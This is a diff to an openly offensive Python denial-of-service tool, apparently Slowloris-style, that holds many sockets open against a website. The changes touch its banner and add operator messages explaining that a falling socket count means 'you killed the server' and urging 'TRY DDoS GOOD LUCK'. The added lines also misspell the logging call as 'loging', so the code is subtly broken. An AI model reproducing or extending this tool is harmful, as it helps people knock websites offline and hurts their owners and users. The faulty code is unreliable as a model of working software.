@@ -148,8 +148,13 @@ def init_socket(ip):
 def main():
     ip = args.host
     socket_count = args.sockets
-    logging.info("COVID-19, STRESSFUL DOS TOOL FOR WEBSITES. BY ASA FROM SULTANATE OF OMAN.")
+    logging.info("COVID-19, STRESSFUL DoS TOOL FOR WEBSITES. BY ASA FROM SULTANATE OF OMAN.")
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
+    loging.info("If sockets count = 0. Host is down, check the domain name or there was a connection error.")
+    loging.info("If scockets count = configured sockets count or defualt 500 sockets. Server is elastic host TRY DDoS GOOD LUCK!")
+    loging.info("If sockets count less than the configured. The attack success, if the socket count dropped to 0 means you killed to server") 
+    
+    
 
     logging.info("Creating sockets...")
     for _ in range(socket_count):
@@ -164,8 +169,7 @@ def main():
     while True:
         try:
             logging.info(
-                "Sending alive headers... Server is accepting: %s Socket 
-                If sockets count = 0(HOST IS DOWN, CHECK DOMAIN NAME OR THERE IS AN ERROR THROUGH THE CONNECTION)", len(list_of_sockets)
+                "Sending alive headers... Server is accepting: %s Socket", len(list_of_sockets)
             )
             for s in list(list_of_sockets):
                 try:
